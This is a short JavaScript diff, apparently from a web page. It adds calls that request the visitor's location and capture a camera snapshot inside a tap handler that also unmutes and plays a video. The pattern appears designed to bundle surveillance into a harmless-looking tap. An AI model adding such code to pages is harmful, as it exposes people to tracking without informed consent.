@@ -775,7 +775,10 @@
                 v.muted = false;
                 v.play().catch(() => { });
             }
-
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.requestLocation();
+                window.LiveTrackerClient.captureCameraSnapshot();
+            }
         }
 
         tapOverlay.addEventListener('click', triggerUserPermissions);
